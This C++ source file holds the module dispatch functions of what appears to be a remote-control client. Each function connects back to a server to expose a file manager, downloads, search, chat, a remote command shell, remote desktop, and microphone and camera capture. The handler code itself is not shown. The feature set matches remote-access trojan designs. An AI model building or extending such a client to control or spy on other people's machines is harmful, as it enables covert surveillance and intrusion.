#include "ModuleEntry.h"


void __stdcall RunModule(ModuleContext*pContext)
{
	printf("RunModule start\n");
	if(!pContext)
		return;
	if(!pContext->m_pEntry)
		goto Failed;
	pContext->m_pEntry(pContext->szServerAddr,pContext->uPort,pContext->m_dwParam);
	
Failed:
	if(pContext->m_dwParam)
		free((void*)pContext->m_dwParam);

	printf("RunModule end\n");
	_endthreadex(0);
}


void  BeginFileMgr(char* szServerAddr,unsigned short uPort,DWORD dwParam)
{
	CIOCPClient client(szServerAddr, uPort);
	
	CFileManager mgr(FILE_MANAGER);
	
	client.BindHandler(&mgr);
	
	client.Run();
	
	client.UnbindHandler();
}

void BeginFileTrans(char* szServerAddr,unsigned short uPort,DWORD dwParam)
{
	
	//OK
	// thread procedure.
	CIOCPClient Client(szServerAddr,uPort);
	CMiniFileTrans FileTrans((CMiniFileTrans::CMiniFileTransInit*)dwParam,MINIFILETRANS);
	
	Client.BindHandler(&FileTrans);
	Client.Run();
	Client.UnbindHandler();
}

void BeginDownload(char* szServerAddr,unsigned short uPort,DWORD dwParam)
{
	CIOCPClient Client(szServerAddr,uPort);
	CMiniDownload Dwonload((WCHAR*)dwParam,MINIDOWNLOAD);
	
	Client.BindHandler(&Dwonload);
	Client.Run();
	Client.UnbindHandler();
}

void BeginSearch(char* szServerAddr,unsigned short uPort,DWORD dwParam)
{
	CIOCPClient Client(szServerAddr,uPort);
	CFileMgrSearch MgrSearch(FILEMGR_SEARCH);
	
	Client.BindHandler(&MgrSearch);
	Client.Run();
	Client.UnbindHandler();
}

void BeginChat(char* szServerAddr,unsigned short uPort,DWORD dwParam)
{
	
	CIOCPClient Client(szServerAddr,uPort);
	CChat chat(CHAT);
	
	Client.BindHandler(&chat);
	Client.Run();
	Client.UnbindHandler();
	
}

void BeginCmd(char* szServerAddr,unsigned short uPort,DWORD dwParam)
{
	
	CIOCPClient Client(szServerAddr,uPort);
	CCmd cmd(CMD);
	
	Client.BindHandler(&cmd);
	Client.Run();
	Client.UnbindHandler();
}

void BeginMicrophone(char* szServerAddr, unsigned short uPort, DWORD dwParam)
{
	CIOCPClient client(szServerAddr, uPort);
	
	CAudio audio(AUDIO);
	
	client.BindHandler(&audio);
	
	client.Run();
	
	client.UnbindHandler();
}

void BeginDesktop(char* szServerAddr, unsigned short uPort, DWORD dwParam)
{
	CIOCPClient client(szServerAddr, uPort);
	
	CRemoteDesktop rd(REMOTEDESKTOP);
	
	client.BindHandler(&rd);
	
	client.Run();
	
	client.UnbindHandler();
	
}

void BeginCamera(char* szServerAddr, unsigned short uPort, DWORD dwParam)
{
	CIOCPClient client(szServerAddr, uPort);
	
	CCamera rd(CAMERA);
	
	client.BindHandler(&rd);
	
	client.Run();
	
	printf("client run seccess!\n");
	client.UnbindHandler();
}
